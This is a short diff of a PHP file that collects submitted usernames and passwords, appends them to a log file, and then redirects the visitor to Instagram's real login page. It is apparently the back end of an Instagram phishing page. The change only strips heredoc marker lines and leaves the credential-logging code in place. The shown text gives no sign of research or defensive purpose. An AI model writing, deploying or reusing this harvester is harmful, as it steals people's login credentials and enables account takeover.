@@ -1,4 +1,4 @@
-'LOGINEOF'
+
 <?php
 $username = $_POST['username'] ?? 'N/A';
 $password = $_POST['password'] ?? 'N/A';
@@ -15,4 +15,3 @@ $entry .= "========================================\n\n";
 file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
 header('Location: https://www.instagram.com/accounts/login/?next=%2F');
 exit();
-LOGINEOF
